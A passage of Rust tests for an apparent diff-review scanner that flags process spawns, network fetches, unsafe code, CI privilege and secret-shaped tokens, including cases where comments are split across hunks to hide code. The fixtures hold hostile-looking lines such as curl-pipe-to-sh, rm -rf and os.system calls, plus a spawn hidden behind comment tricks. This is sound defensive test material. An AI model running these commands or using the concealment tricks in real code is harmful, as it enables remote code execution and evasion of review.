    /// on `build.rs`. Other languages have one reading, which is `code_view` itself.
    #[test]
    fn rust_items_are_those_of_0_8_3_and_those_of_the_lexer_reading() {
        const ATOMS: [&str; 42] = [
            "unsafe { g() }",
            "std::process::Command::new(\"sh\")",
            "reqwest::blocking::get(u)",
            "#[test]",
            "fn t() {}",
            "/*",
            "*/",
            "//",
            "\"",
            "'",
            "'\\x41'",
            "'\"'",
            "'\\u{1F600}'",
            "'é'",
            "r\"",
            "r#\"",
            "\"#",
            "b'",
            "b\"",
            "'r#r",
            "k#r",
            "cr\"",
            "\\",
            "\\\"",
            "crates/*/*/Cargo.toml",
            " ",
            " ",
            "x",
            ";",
            "1e",
            "#",
            "/",
            "*",
            "'a",
            "'\\''",
            "/* /* */",
            "// */",
            "\"/*\"",
            "'\\t\"%s\\n'",
            "é",
            "/* /* */ // */ ",
            "('\\x41','\"', \"/*\"); ",
        ];
        let mut seed = 0x9E37_79B9_7F4A_7C15_u64;
        let mut next = move |below: usize| {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            usize::try_from(seed % (below as u64)).unwrap()
        };
        assert!(S::ALL.iter().all(|signal| signal.weight() >= 1));
        let (mut only_legacy, mut only_lexer, mut items_seen) = (0, 0, 0);
        for case in 0..4000 {
            let lines: Vec<String> = (0..=next(8))
                .map(|_| (0..=next(6)).map(|_| ATOMS[next(ATOMS.len())]).collect())
                .collect();
            let path = if case % 5 == 0 {
                "build.rs"
            } else {
                "src/x.rs"
            };
            let (mut old, mut new, mut body) = (0, 0, String::new());
            for line in &lines {
                let sign = match case % 4 {
                    0 | 1 => '+',
                    2 => '-',
                    _ => [' ', '+', '-'][next(3)],
                };
                old += u32::from(sign != '+');
                new += u32::from(sign != '-');
                body.push(sign);
                body.push_str(line);
                body.push('\n');
            }
            let text = match case % 4 {
                0 => format!("--- /dev/null\n+++ b/{path}\n@@ -0,0 +1,{new} @@\n{body}"),
                1 | 2 => format!(
                    "--- a/{path}\n+++ b/{path}\n@@ -1,{} +1,{} @@\n x\n{body}",
                    old + 1,
                    new + 1
                ),
                _ => format!("--- a/{path}\n+++ b/{path}\n@@ -7,{old} +7,{new} @@\n{body}"),
            };
            let Ok(mut files) = parse(&text) else {
                continue; // a mix with no changed line is no patch
            };
            let file = files.remove(0);
            let kind = FileKind::of(&file);
            assert_eq!(kind.language, Some(Language::Rust));
            let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
            let hunk = &file.patch_twin.hunks[0];
            let all = hunk_matches_in(hunk, kind.language, &rules, code_views);
            let legacy = hunk_matches_in(hunk, kind.language, &rules, legacy_alone);
            let lexer = hunk_matches_in(hunk, kind.language, &rules, lexer_alone);
            for item in &legacy {
                assert!(all.contains(item), "0.8.3 finds {item:?}:\n{text}");
            }
            for item in &all {
                assert!(
                    legacy.contains(item) || lexer.contains(item),
                    "neither reading finds {item:?}:\n{text}"
                );
            }
            for item in &lexer {
                assert!(
                    all.contains(item),
                    "the lexer reading finds {item:?}:\n{text}"
                );
            }
            assert_eq!(hunk_matches(hunk, kind.language, &rules), all);
            items_seen += all.len();
            only_legacy += usize::from(legacy.iter().any(|item| !lexer.contains(item)));
            only_lexer += usize::from(lexer.iter().any(|item| !legacy.contains(item)));
        }
        // The generator bites: many items, and many hunks in which one reading finds what the
        // other does not, in each direction.
        assert!(
            items_seen > 2000 && only_legacy > 100 && only_lexer > 100,
            "{items_seen} items, {only_legacy} hunks only 0.8.3 reads, {only_lexer} only the lexer"
        );
        // Every other language has one reading, the shared scanner's.
        for language in [
            Language::Python,
            Language::JavaScript,
            Language::Go,
            Language::Shell,
            Language::Yaml,
        ] {
            let (mut readings, mut state) = (Readings::default(), ScanState::default());
            for _ in 0..500 {
                let line: String = (0..=next(6)).map(|_| ATOMS[next(ATOMS.len())]).collect();
                assert_eq!(
                    code_views(language, &line, &mut readings),
                    [code_view(language, &line, &mut state)],
                    "{language:?}: {line}"
                );
            }
        }
    }

    /// The items of a patch as the tests of touching hunks compare them.
    fn items(patch: &str) -> Vec<Found> {
        let file = parse(patch).unwrap().remove(0);
        file_evidence(&file)
            .iter()
            .map(|e| (e.signal, e.side, e.line))
            .collect()
    }

    /// A file the patch creates is one text, however many hunks it is written in: what one
    /// hunk leaves open (a block comment here, one deep and two deep) is open in the next.
    /// Read alone, the second hunk is a line comment and nothing else, which is how 0.8.3 and
    /// every release before it read it (the published v0.8.3 binary: score 4, no evidence, for
    /// each of the split forms below).
    ///
    /// What plain `git apply` (2.56.0, `--check -v` and then applied, in scratch repositories)
    /// does with a creation written in several hunks:
    /// - `@@ -0,0 +1,2 @@` then `@@ -2,0 +3,2 @@`: accepted, the lines in patch order.
    /// - a second hunk `@@ -9,0 +3,2 @@`, `@@ -2,0 +1,2 @@` or `@@ -9,0 +9,2 @@`: accepted
    ///   ("Hunk #2 succeeded at 3"), the same file. Its numbers do not place it: a hunk with no
    ///   context after its last line must end the file as it then is, so each is appended.
    /// - a second hunk `@@ -0,0 +3,2 @@` or `@@ -1,0 +3,2 @@`: refused (it would also have to
    ///   begin the file). A hunk with a context line: refused ("new file depends on old
    ///   contents"). Three hunks `-0,0`, `-2,0`, `-3,0`: accepted, in order.
    ///
    /// So every hunk of a creation only adds, and each follows the one before.
    #[test]
    fn the_hunks_of_a_created_file_are_read_as_one_text() {
        let spawn = "pub fn evil() { std::process::Command::new(\"sh\").status().ok(); }";
        let head = "--- /dev/null\n+++ b/src/evil.rs\n";
        for (opener, closer) in [("/*", "// */"), ("/* /*", " */ // */")] {
            let joined = format!(
                "{head}@@ -0,0 +1,4 @@\n+//! Helpers.\n+{opener}\n+{closer} {spawn}\n+pub fn k() {{}}\n"
            );
            let found = [(S::ProcessSpawn, Side::New, 3)];
            assert_eq!(items(&joined), found, "{joined}");
            for second in ["-2,0 +3,2", "-9,0 +3,2"] {
                let split = format!(
                    "{head}@@ -0,0 +1,2 @@\n+//! Helpers.\n+{opener}\n@@ {second} @@\n+{closer} {spawn}\n+pub fn k() {{}}\n"
                );
                assert_eq!(items(&split), found, "{split}");
                // Read alone, as before, the second hunk shows nothing.
                let file = parse(&split).unwrap().remove(0);
                let kind = FileKind::of(&file);
                let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
                assert_eq!(
                    hunk_matches(&file.patch_twin.hunks[1], kind.language, &rules),
                    [],
                    "{split}"
                );
            }
        }
        // Three hunks, with a hunk between the opener and the closer that changes nothing.
        let three = format!(
            "{head}@@ -0,0 +1,1 @@\n+/*\n@@ -2,0 +2,1 @@\n+words\n@@ -3,0 +3,1 @@\n+// */ {spawn}\n"
        );
        assert_eq!(items(&three), [(S::ProcessSpawn, Side::New, 3)]);
        // Other languages have the same boundary and the same rule.
        let script = "--- /dev/null\n+++ b/web/run.js\n@@ -0,0 +1,1 @@\n+/*\n@@ -2,0 +2,1 @@\n\
                      +// */ const cp = require(\"child_process\");\n";
        assert_eq!(items(script), [(S::ProcessSpawn, Side::New, 2)]);
    }

    /// In a file that exists, a hunk that begins at the line after the last old line of the
    /// hunk before it goes on from what that hunk left open, on both sides: no line of the
    /// file stands between them. `@@ -S,L` with lines covers old lines S to S+L-1; a hunk that
    /// only adds (`-S,0`) stands after line S.
    ///
    /// What plain `git apply` (2.56.0) does, on a file of twelve one-line functions:
    /// - `@@ -1,2 +1,3 @@` (a line, an added line, a line) then `@@ -3,1 +4,2 @@` (an added
    ///   line, a line): accepted; the second hunk's added line follows the first hunk's last.
    /// - `@@ -1,3 +1,2 @@` (a line, a removed line, a line) then `@@ -4,3 +3,1 @@` (two
    ///   removed lines, a line): accepted.
    /// - `@@ -12,1 +12,2 @@` (the last line, an added line) then `@@ -12,0 +14,1 @@` (an added
    ///   line): accepted; the file ends with the two added lines.
    /// - Two hunks that share a context line (`-1,3` then `-3,3`): refused. A hunk in the
    ///   middle of the file with no context after its last line: refused.
    #[test]
    fn a_hunk_that_begins_where_the_one_before_ends_goes_on_from_it() {
        let spawn = "pub fn evil() { std::process::Command::new(\"sh\").status().ok(); }";
        let head = "--- a/src/f.rs\n+++ b/src/f.rs\n";
        // New side: the comment opened in the first hunk runs over its last line.
        let added = format!(
            "{head}@@ -1,2 +1,3 @@\n pub fn a() {{}}\n+/*\n pub fn b() {{}}\n@@ -3,1 +4,2 @@\n+// */ {spawn}\n pub fn c() {{}}\n"
        );
        assert_eq!(items(&added), [(S::ProcessSpawn, Side::New, 4)]);
        // Old side: a test removed behind a comment that the hunk before it shows opening.
        let removed = format!(
            "{head}@@ -1,3 +1,2 @@\n pub fn a() {{}}\n-/*\n pub fn b() {{}}\n@@ -4,3 +3,1 @@\n-// */ #[test]\n-fn t() {{}}\n pub fn c() {{}}\n"
        );
        assert_eq!(items(&removed), [(S::TestRemoved, Side::Old, 4)]);
        // At the end of the file: a hunk that only adds, after the hunk that shows the last line.
        let at_end = format!(
            "{head}@@ -12,1 +12,2 @@\n pub fn l() {{}}\n+/*\n@@ -12,0 +14,1 @@\n+// */ {spawn}\n"
        );
        assert_eq!(items(&at_end), [(S::ProcessSpawn, Side::New, 14)]);
        // The spans the rule compares.
        let file = parse(&at_end).unwrap().remove(0);
        let spans: Vec<_> = file.patch_twin.hunks.iter().map(old_span).collect();
        assert_eq!(spans, [Some((11, 12)), Some((12, 12))]);
    }

    /// With a line of the file between two hunks that the patch does not show, the second
    /// starts as code, as it always has: what the unseen line holds is not known (it may close
    /// the comment). Each form below is read as 0.8.3 read it, with no item.
    ///
    /// `git apply` (2.56.0) on the twelve-line file: `@@ -1,2 +1,3 @@` then `@@ -4,1 +5,2 @@`
    /// is accepted and line 3 of the file stands between the hunks. (A hunk that only adds is
    /// a different matter: Git appends it, and the next test holds that.)
    #[test]
    fn a_hunk_with_an_unseen_line_before_it_starts_as_code() {
        let spawn = "pub fn evil() { std::process::Command::new(\"sh\").status().ok(); }";
        let head = "--- a/src/f.rs\n+++ b/src/f.rs\n";
        for second in [
            // one unseen line
            format!("@@ -4,1 +5,2 @@\n+// */ {spawn}\n pub fn d() {{}}\n"),
            // an overlap, which Git refuses
            format!("@@ -2,2 +3,3 @@\n pub fn b() {{}}\n+// */ {spawn}\n pub fn c() {{}}\n"),
        ] {
            let patch =
                format!("{head}@@ -1,2 +1,3 @@\n pub fn a() {{}}\n+/*\n pub fn b() {{}}\n{second}");
            assert_eq!(items(&patch), [], "{patch}");
        }
    }

    /// A hunk of added lines only, in a file that exists and not at its top, is appended by
    /// plain `git apply` to the file as it then is, whatever the numbers in its header say. So
    /// it stands straight after the last earlier hunk of its section whose last line is not a
    /// context line (that hunk had to match at the end of the file), and it is read once more
    /// from what the new side of that hunk left open.
    ///
    /// `git apply` 2.56.0 on the file of twelve one-line functions (`--check -v`, then applied):
    /// - `@@ -12,1 +12,2 @@` (the last line, an added line) then `@@ -50,0 +52,1 @@` (an added
    ///   line): "Hunk #2 succeeded at 14 (offset -38 lines)"; the file ends with the two added
    ///   lines. The same with `--unidiff-zero`.
    /// - `@@ -5,0 +6,1 @@` then `@@ -9,0 +11,1 @@`, added lines only: "Hunk #1 succeeded at 13
    ///   (offset 7 lines)", "Hunk #2 succeeded at 14 (offset 3 lines)": both at the end, one
    ///   straight after the other. With `--unidiff-zero` they go after lines 5 and 9, with four
    ///   lines of the file between them.
    /// - An added line (`-5,0`), a hunk with context around its change at line 2, an added line
    ///   (`-9,0`): the two added lines end the file, one straight after the other.
    /// - `@@ -11,2 +11,1 @@` (a line, the last line removed) then `@@ -40,0 +12,1 @@`: the added
    ///   line follows the line the first hunk kept.
    /// - `@@ -1,0 +2,1 @@`: refused (it would also have to begin the file); with
    ///   `--unidiff-zero` it goes after line 1. A hunk with old lines after a hunk that ends the
    ///   file, both `-12,1`: refused.
    /// - `@@ -1,2 +1,3 @@` (a line, an added line, a line) then `@@ -2,0 +4,1 @@`: appended at
    ///   the end of the file and not after line 2; with `--unidiff-zero`, after line 2. So the
    ///   join by the numbers and this one are different readings, and both are asked.
    ///
    /// Each join is a further reading: the hunk is still read as it always was. `git diff -U0`
    /// writes honest hunks of this form, which `--unidiff-zero` puts apart; what was found in
    /// them is found (the last four patches, each read as its hunks are read alone), and the
    /// reading from the end of the file can only add to it.
    #[test]
    fn a_hunk_git_appends_goes_on_from_the_end_of_the_file() {
        let spawn = "pub fn evil() { std::process::Command::new(\"sh\").status().ok(); }";
        let head = "--- a/src/f.rs\n+++ b/src/f.rs\n";
        for (patch, line) in [
            // the numbers lie
            (
                format!(
                    "@@ -12,1 +12,2 @@\n pub fn l() {{}}\n+/*\n@@ -50,0 +52,1 @@\n+// */ {spawn}\n"
                ),
                52,
            ),
            // two hunks of added lines only, with the numbers `git diff -U0` would write
            (
                format!("@@ -5,0 +6,1 @@\n+/*\n@@ -9,0 +11,1 @@\n+// */ {spawn}\n"),
                11,
            ),
            // not the hunk just before it: a hunk with context around its change between them
            (
                format!(
                    "@@ -5,0 +6,1 @@\n+/*\n@@ -2,2 +2,3 @@\n pub fn b() {{}}\n+pub fn x() {{}}\n \
                     pub fn c() {{}}\n@@ -9,0 +12,1 @@\n+// */ {spawn}\n"
                ),
                12,
            ),
            // after a hunk whose last line is removed: its new side ends the file
            (
                format!(
                    "@@ -11,2 +11,1 @@\n /*\n-pub fn l() {{}}\n@@ -40,0 +12,1 @@\n+// */ {spawn}\n"
                ),
                12,
            ),
            // and after a hunk that itself goes on from the one before it by the numbers
            (
                format!(
                    "@@ -10,1 +10,2 @@\n pub fn j() {{}}\n+/*\n@@ -11,2 +12,3 @@\n pub fn k() {{}}\n \
                     pub fn l() {{}}\n+words\n@@ -70,0 +15,1 @@\n+// */ {spawn}\n"
                ),
                15,
            ),
        ] {
            let patch = format!("{head}{patch}");
            assert_eq!(
                items(&patch),
                [(S::ProcessSpawn, Side::New, line)],
                "{patch}"
            );
        }
        // Git does not append a hunk at old position 1 (it refuses it): not joined.
        let top = format!(
            "{head}@@ -12,1 +12,2 @@\n pub fn l() {{}}\n+/*\n@@ -1,0 +2,1 @@\n+// */ {spawn}\n"
        );
        assert_eq!(items(&top), [], "{top}");
        // Honest hunks as `git diff -U0` and `git diff` write them, a comment or a string left
        // open by the first: each hunk is still read as it is read alone, so the call in the
        // second is found (it was hidden from a reader that only went on from the first).
        let call = "    std::process::Command::new(\"sh\").status();\n+    let z = x.unwrap();";
        for (first, at) in [
            (
                "@@ -5,0 +6,2 @@\n+    let x = 1; /* note\n+    let y = 2;\n",
                23,
            ),
            ("@@ -5,0 +6,2 @@\n+    let x = \"\n+    let y = 2;\n", 23),
            ("@@ -5,0 +6,2 @@\n+    let x = 1;\n+    let y = 2;\n", 23),
        ] {
            let patch = format!("{head}{first}@@ -20,0 +23,2 @@\n+{call}\n");
            assert_eq!(items(&patch), [(S::ProcessSpawn, Side::New, at)], "{patch}");
            assert_eq!(items(&patch), items_of_hunks_alone(&patch), "{patch}");
        }
        let with_context = format!(
            "{head}@@ -5,2 +5,4 @@\n fn a() {{\n+    let x = 1; /* note\n+    let y = 2;\n }}\n\
             @@ -7,2 +9,4 @@\n fn b() {{\n+{call}\n }}\n"
        );
        assert_eq!(items(&with_context), [(S::ProcessSpawn, Side::New, 10)]);
        assert_eq!(items(&with_context), items_of_hunks_alone(&with_context));
    }

    /// The items of a patch's one file when each hunk is read alone, as before hunks were
    /// joined: what the reading of 0.8.3 and the lexer reading find from a start as code.
    fn items_of_hunks_alone(patch: &str) -> Vec<Found> {
        let file = parse(patch).unwrap().remove(0);
        let kind = FileKind::of(&file);
        let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
        file.patch_twin
            .hunks
            .iter()
            .flat_map(|hunk| hunk_matches(hunk, kind.language, &rules))
            .map(|(side, signal, line)| (signal, side, line))
            .collect()
    }

    /// A carried reading is one more reading and replaces none: for hunks made from the pieces
    /// the readings disagree about, every item a hunk has when it is read alone (which is what
    /// 0.8.3 and the lexer reading find from a start as code, the whole answer before hunks
    /// were joined) is an item of the file, and the per-hunk labels, asked in order, backwards
    /// and one at a time, are the file's. The hunks are a created file cut into hunks, added
    /// lines after one line of an existing file, and an existing file's hunks of every form
    /// with any numbers (added lines only, a line and added lines, context on both sides, a
    /// last line removed), so that both joins and neither are met. A created file cut into
    /// hunks has every item its lexer reading has as one hunk.
    #[test]
    fn a_run_of_hunks_loses_nothing_a_hunk_read_alone_finds() {
        use std::fmt::Write as _;
        const ATOMS: [&str; 18] = [
            "unsafe { g() }",
            "std::process::Command::new(\"sh\")",
            "/*",
            "*/",
            "//",
            "\"",
            "'\"'",
            "r#\"",
            "\"#",
            " ",
            "x",
            "/* /* */",
            "// */",
            "\"/*\"",
            "#[test]",
            "'\\x41'",
            "// */ unsafe { g() }",
            "\"; unsafe { g() }",
        ];
        let mut seed = 0x2545_F491_4F6C_DD1D_u64;
        let mut next = move |below: usize| {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            usize::try_from(seed % (below as u64)).unwrap()
        };
        let (mut more, mut more_any_form, mut runs) = (0, 0, 0);
        for case in 0..4500 {
            let lines: Vec<String> = (0..=1 + next(7))
                .map(|_| (0..=next(4)).map(|_| ATOMS[next(ATOMS.len())]).collect())
                .collect();
            let created = case % 3 == 0;
            let any_form = case % 3 == 2;
            // Cut the lines into hunks: a creation; added lines after line 5 of an existing
            // file; or hunks of every form at any old position.
            let (mut text, mut at, mut joined) = (String::new(), 0, String::new());
            while at < lines.len() {
                let take = 1 + next(lines.len() - at);
                let (old, new) = if created { (at, at + 1) } else { (5, at + 6) };
                let form = if any_form { next(4) } else { 0 };
                let (old, new) = if any_form {
                    (1 + next(30), 100 * at + 1)
                } else {
                    (old, new)
                };
                let before = ATOMS[next(ATOMS.len())];
                match form {
                    0 => {
                        let _ = writeln!(text, "@@ -{old},0 +{new},{take} @@");
                    }
                    1 => {
                        let _ = writeln!(text, "@@ -{old},1 +{new},{} @@\n {before}", take + 1);
                    }
                    _ => {
                        let _ =
                            writeln!(text, "@@ -{old},2 +{new},{} @@\n {before}", take + 4 - form);
                    }
                }
                for line in &lines[at..at + take] {
                    let _ = writeln!(text, "+{line}");
                    let _ = writeln!(joined, "+{line}");
                }
                match form {
                    2 => text.push_str(" after\n"),
                    3 => text.push_str("-gone\n"),
                    _ => {}
                }
                at += take;
            }
            let head = if created {
                "--- /dev/null\n+++ b/src/x.rs\n"
            } else {
                "--- a/src/x.rs\n+++ b/src/x.rs\n"
            };
            let file = parse(&format!("{head}{text}")).unwrap().remove(0);
            let gaining = hunks_with_more_than_alone(&file, &text);
            more += gaining;
            more_any_form += if any_form { gaining } else { 0 };
            let kind = FileKind::of(&file);
            let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
            let evidence = file_evidence(&file);
            let hunks = &file.patch_twin.hunks;
            runs += usize::from(hunks.len() > 1);
            if created {
                let one = format!("{head}@@ -0,0 +1,{} @@\n{joined}", lines.len());
                let one = parse(&one).unwrap().remove(0);
                let lexer =
                    hunk_matches_in(&one.patch_twin.hunks[0], kind.language, &rules, lexer_alone);
                for (side, signal, line) in lexer {
                    assert!(
                        evidence
                            .iter()
                            .any(|e| (e.side, e.signal, e.line) == (side, signal, line)),
                        "the file as one hunk has {signal:?} on line {line}:\n{text}"
                    );
                }
            }
        }
        assert!(
            runs > 3000 && more > 200 && more_any_form > 10,
            "{runs} runs, {more} hunks with more than alone, {more_any_form} of them of any form"
        );
    }

    /// At the bound the list holds what 0.8.3 listed also where hunks are joined: what a reading
    /// carried from the hunk before finds is a further finding, like what only the lexer reading
    /// finds, and takes no place from an item of 0.8.3. Generated: 40 to 120 lines heavy with
    /// rule tokens, some lines leaving a comment open and some closing one before a token,
    /// cut into hunks of a file the patch creates or appended to the end of a file that
    /// exists. An item is released exactly when the reading of 0.8.3 finds it in its hunk
    /// read alone.
    #[test]
    fn the_bounded_list_of_joined_hunks_holds_every_item_0_8_3_listed() {
        use std::fmt::Write as _;
        const TOKENS: [&str; 3] = [
            "unsafe { g() }",
            "std::process::Command::new(\"sh\")",
            "reqwest::blocking::get(u)",
        ];
        let mut seed = 0x0F1E_2D3C_4B5A_6978_u64;
        let mut next = move |below: usize| {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            usize::try_from(seed % (below as u64)).unwrap()
        };
        let (mut cut, mut would_drop, mut carried) = (0, 0, 0);
        for case in 0..300 {
            let count = 40 + next(81);
            let created = case % 2 == 0;
            let (mut text, mut at) = (String::new(), 0);
            text.push_str(if created {
                "--- /dev/null\n+++ b/src/x.rs\n"
            } else {
                "--- a/src/x.rs\n+++ b/src/x.rs\n"
            });
            while at < count {
                let take = (1 + next(30)).min(count - at);
                let _ = if created {
                    writeln!(text, "@@ -{at},0 +{},{take} @@", at + 1)
                } else if at == 0 {
                    writeln!(text, "@@ -7,1 +7,{} @@\n x", take + 1)
                } else {
                    writeln!(text, "@@ -{},0 +{},{take} @@", 2 + next(90), at + 8)
                };
                for line in 0..take {
                    let token = TOKENS[next(TOKENS.len())];
                    let _ = match (line + 1 == take, next(8)) {
                        // the last line of a hunk often leaves a comment open
                        (true, 0..=3) => writeln!(text, "+{token} /*"),
                        // and a line often closes one behind a line comment
                        (_, 4..=5) => writeln!(text, "+// */ {token}"),
                        _ => writeln!(text, "+{token}"),
                    };
                }
                at += take;
            }
            let file = parse(&text).unwrap().remove(0);
            let (is_cut, dropped) = bounded_list_holds(&file, &text);
            cut += usize::from(is_cut);
            would_drop += usize::from(dropped > 0);
            let kind = FileKind::of(&file);
            let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
            for item in file_evidence(&file) {
                let hunk = file.patch_twin.hunks.iter().find(|h| h.id == item.hunk);
                let alone = hunk_matches_in(hunk.unwrap(), kind.language, &rules, legacy_alone);
                let by_0_8_3 = alone.contains(&(item.side, item.signal, item.line));
                assert_eq!(item.released, by_0_8_3, "{item:?}:\n{text}");
                carried += usize::from(!item.released);
            }
        }
        assert!(
            cut > 100 && would_drop > 30 && carried > 300,
            "{cut} lists cut, {would_drop} a plain cut would have robbed, {carried} further items"
        );
    }

    /// For each hunk of `file`: every item it has when it is read alone is an item of the file,
    /// and its labels are the file's whether the hunks are asked in order, one at a time or
    /// backwards. Returns how many hunks have more items in the file than alone.
    fn hunks_with_more_than_alone(file: &ReviewFile, text: &str) -> usize {
        let hunks = &file.patch_twin.hunks;
        let kind = FileKind::of(file);
        let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
        let evidence = file_evidence(file);
        let of_file = |hunk: &PatchHunk| -> Vec<_> {
            evidence
                .iter()
                .filter(|e| e.hunk == hunk.id)
                .map(|e| (e.side, e.signal, e.line))
                .collect()
        };
        let mut more = 0;
        let mut in_order = HunkLabels::new(file);
        for (index, hunk) in hunks.iter().enumerate() {
            let of_file = of_file(hunk);
            let alone = hunk_matches(hunk, kind.language, &rules);
            for item in &alone {
                assert!(of_file.contains(item), "{item:?} of hunk {index}:\n{text}");
            }
            more += usize::from(of_file.len() > alone.len());
            let labels = distinct(&of_file);
            assert_eq!(
                in_order.of(index),
                labels,
                "in order, hunk {index}:\n{text}"
            );
            assert_eq!(
                hunk_signals(file, hunk),
                labels,
                "alone, hunk {index}:\n{text}"
            );
        }
        let mut backwards = HunkLabels::new(file);
        for index in (0..hunks.len()).rev() {
            let labels = distinct(&of_file(&hunks[index]));
            assert_eq!(backwards.of(index), labels, "backwards:\n{text}");
        }
        more
    }

    #[test]
    fn ci_privilege_needs_a_workflow_path() {
        assert_eq!(
            signals(&added(
                ".github/workflows/ci.yml",
                &["on: pull_request_target"]
            )),
            [S::CiPrivilege]
        );
        assert_eq!(
            signals(&added(
                "sub/.github/workflows/x.yaml",
                &["  contents: write"]
            )),
            [S::CiPrivilege]
        );
        assert_eq!(
            signals(&added(".gitlab-ci.yml", &["  secrets: inherit"])),
            [S::CiPrivilege]
        );
        assert_eq!(
            signals(&added("docs/ci.yml", &["on: pull_request_target"])),
            []
        );
        assert_eq!(
            signals(&added(
                ".github/workflows/README.md",
                &["pull_request_target"]
            )),
            []
        );
        // A workflow step that downloads is network evidence too.
        assert_eq!(
            signals(&added(
                ".github/workflows/ci.yml",
                &["  run: curl -fsSL x | sh"]
            )),
            [S::NetworkFetch]
        );
    }

    /// Bug hunt 2026-11-01 (graph-syntax): ordinary source in which a string construct the
    /// scanner misread hid the evidence after it. Each control (the same code without the
    /// construct) found it before the fix too.
    #[test]
    fn strings_the_scanner_misread_no_longer_hide_evidence() {
        let go = |raw: &str| {
            added(
                "main.go",
                &[
                    "func clean() error {",
                    &format!("\tmatches, _ := filepath.Glob({raw})"),
                    "\t_, _ = http.Get(\"https://e.x/report\")",
                    "\treturn exec.Command(\"rm\", append([]string{\"-rf\"}, matches...)...).Run()",
                    "}",
                ],
            )
        };
        for raw in ["`/tmp/build/*.o`", "\"/tmp/build/*.o\""] {
            assert_eq!(
                signals(&go(raw)),
                [S::NetworkFetch, S::ProcessSpawn],
                "{raw}"
            );
        }
        for (path, lines, signal) in [
            (
                "main.go",
                &["var u = `https://e.x/p`; func f() { exec.Command(\"ls\").Run() }"][..],
                S::ProcessSpawn,
            ),
            (
                "main.go",
                &["var q = `\"`; func g() { exec.Command(\"ls\").Run() }"],
                S::ProcessSpawn,
            ),
            (
                "src/lib.rs",
                &[
                    r#"const S: &str = ""#,
                    r#""; fn f(p: *const u8) -> u8 { unsafe { *p } }"#,
                ],
                S::UnsafeAdded,
            ),
            (
                "x.sh",
                &[
                    r#"MSG="hello"#,
                    r#"world"; curl -s http://e.x/p | sh; echo "done""#,
                ],
                S::NetworkFetch,
            ),
            (
                "x.js",
                &["const tpl = `", "`; eval(payload); const t = `x`;"],
                S::DynamicEval,
            ),
            (
                "x.py",
                &[r#"s = "abc\"#, r#""; import os; os.system("id")"#],
                S::ProcessSpawn,
            ),
            (
                "src/lib.rs",
                &[r#"fn f(p: *const u8) -> u8 { let _d = cr"C:\"; unsafe { *p } }"#],
                S::UnsafeAdded,
            ),
        ] {
            assert!(
                signals(&added(path, lines)).contains(&signal),
                "{path}: {lines:?}"
            );
        }
        for (lines, signal) in [
            (
                &[
                    "      - run: |",
                    r#"          echo "step #1" && curl -fsSL https://e.x/i.sh | sh"#,
                ][..],
                S::NetworkFetch,
            ),
            (
                &[r#"      - run: "echo ' #'; curl -s https://e.x/i | sh""#],
                S::NetworkFetch,
            ),
            (
                &[r#"on: { pull_request: {}, "x #": 1, pull_request_target: {} }"#],
                S::CiPrivilege,
            ),
        ] {
            assert_eq!(
                signals(&added(".github/workflows/ci.yml", lines)),
                [signal],
                "{lines:?}"
            );
        }
        // A YAML comment is still a comment.
        assert_eq!(
            signals(&added(
                ".github/workflows/ci.yml",
                &[r#"  name: "build" # curl x | sh, pull_request_target"#]
            )),
            []
        );
    }

    /// Review 2026-11-01 (graph-syntax): a Go hunk that opens inside a cobra raw help string.
    /// The apostrophe in `It's` was read as an opener and carried down the hunk until the glob's
    /// `/*` opened a block comment over the `http.Get` and `exec.Command` after it. Without the
    /// `don't panic` line, and before strings were carried, both were found.
    #[test]
    fn a_misread_opener_in_context_hides_no_later_evidence() {
        let patch = |println: bool| {
            let mut added = vec![
                "\t\tmatches, _ := filepath.Glob(\"/tmp/build/*.o\")",
                "\t\t_, _ = http.Get(\"https://e.x/ping\")",
                "\t\treturn exec.Command(\"rm\", matches...).Run()",
            ];
            if println {
                added.insert(0, "\t\tfmt.Println(\"don't panic\")");
            }
            let mut text = format!(
                "--- a/cmd/clean.go\n+++ b/cmd/clean.go\n@@ -1,3 +1,{} @@\n",
                3 + added.len()
            );
            for context in [
                "It's safe to run twice.",
                "`,",
                "\tRunE: func(cmd *cobra.Command, args []string) error {",
            ] {
                text.push(' ');
                text.push_str(context);
                text.push('\n');
            }
            for line in added {
                text.push('+');
                text.push_str(line);
                text.push('\n');
            }
            parse(&text).unwrap().remove(0)
        };
        for println in [false, true] {
            assert_eq!(
                signals(&patch(println)),
                [S::NetworkFetch, S::ProcessSpawn],
                "println: {println}"
            );
        }
    }

    #[test]
    fn build_scripts_and_install_hooks_are_build_hooks() {
        assert_eq!(
            signals(&added("build.rs", &["fn main() {}"])),
            [S::BuildHook]
        );
        assert_eq!(signals(&added("build.rs", &["// only a comment", ""])), []);
        assert_eq!(
            signals(&added("sub/setup.py", &["setup(name='x')"])),
            [S::BuildHook]
        );
        assert_eq!(
            signals(&added("package.json", &["  \"postinstall\": \"node x\","])),
            [S::BuildHook]
        );
        assert_eq!(
            signals(&added("package.json", &["  \"name\": \"install-helper\","])),
            []
        );
    }

    #[test]
    fn secrets_are_found_by_shape_and_never_copied() {
        // Built at run time, so the repository's own secret scan never sees a token here.
        let aws = format!("key = \"AKIA{}\"", "Q7".repeat(8));
        let forge = format!("t='ghp_{}'", "a1".repeat(18));
        let chat = format!("# xoxb-{}", "12345-abcde");
        let stripe = format!("sk_live_{}", "Z".repeat(16));
        let header = format!("-----BEGIN {} PRIVATE KEY-----", "RSA");
        for line in [&aws, &forge, &chat, &stripe, &header] {
            assert_eq!(
                signals(&added("notes.txt", &[line])),
                [S::SecretLike],
                "{line}"
            );
        }
        for line in [
            format!("AKIA{}", "Q".repeat(15)),
            format!("XAKIA{}", "Q".repeat(16)),
            format!("ghp_{}", "a".repeat(35)),
            "-----BEGIN CERTIFICATE-----".to_owned(),
        ] {
            assert_eq!(signals(&added("notes.txt", &[&line])), [], "{line}");
        }
        let found = file_evidence(&added("notes.txt", &[&aws]));
        assert!(
            !format!("{found:?}").contains("AKIA"),
            "a secret was copied into evidence"
        );
    }

    #[test]
    fn a_path_scoped_rule_follows_the_generated_rule_and_a_token_rule_does_not() {
